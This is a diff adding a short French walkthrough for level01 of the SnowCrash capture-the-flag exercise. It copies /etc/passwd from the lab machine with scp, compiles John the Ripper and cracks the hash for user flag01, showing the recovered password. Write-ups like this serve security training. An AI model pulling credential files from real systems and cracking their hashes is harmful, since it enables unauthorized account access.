@@ -1,0 +1,20 @@
+scp -P 4242 level01@ip_de_SnowCrash:/etc/passwd .
+
+On telecharge le logiciel John the Ripper.
+(http://www.openwall.com/john/, puis tar -xf john-1.8.0.tar.xz)
+On compile :
+dans ./src:
+make
+make clean SYSTEM
+make clean generic
+
+On lance John:
+dans ./run
+./john --show passwd
+(passwd obtenu avec le scp du /etc/passwd)
+
+Resultat:
+
+flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash
+1 password hash cracked, 0 left
+
